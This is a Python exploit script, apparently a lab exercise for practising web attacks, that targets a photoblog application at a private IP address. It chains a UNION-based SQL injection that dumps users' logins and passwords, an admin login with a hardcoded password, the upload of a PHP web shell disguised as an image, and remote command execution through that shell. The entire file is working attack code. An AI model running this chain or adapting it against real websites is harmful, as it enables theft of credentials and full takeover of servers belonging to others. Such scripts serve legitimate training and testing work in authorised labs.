import requests

target="172.16.113.157"
path_file="/home/nyanyi/awae/preparacion/sqli_to_shell/solucion/console.php3"
command='uname -a'

def sqli(target):
    path_sqli="/cat.php"
    url = "http://" + target + path_sqli
    payload = {'id':"2 UNION SELECT NULL,concat_ws(' : ' ,id,login,password),NULL,NULL FROM photoblog.users"}
    r=requests.get(url, params=payload, verify=False)
    print(r.text)

def login(target):
    path="/admin/index.php"
    url="http://" + target + path
    payload={'user':'admin', 'password':'P4ssw0rd'}
    r=requests.post(url, data=payload, verify=False)
    print(r.status_code)
    return(r.cookies['PHPSESSID'])

def file_upload(target,idcookies):
    path="/admin/index.php"
    url = "http://" + target + path
    payload = {'title':"hpl", 'category':'1', 'Add':'Add'}
    files={'image':('lovecraft.php3',open(path_file,'rb'),'application/x-php')}
    cookies=dict(PHPSESSID=idcookies)
    r= requests.post(url, files=files, data=payload, cookies=cookies, verify=False)

def remote_console(target,command):
    path="/admin/uploads/lovecraft"
    url = "http://" + target + path
    payload = {'cmd':command}
    r=requests.get(url, params=payload, verify=False)
    print(r.text)

def main():
    sqli(target)
    idcookies=login(target)
    file_upload(target,idcookies)
    remote_console(target, command)
	
#start

if __name__=="__main__":
    main()
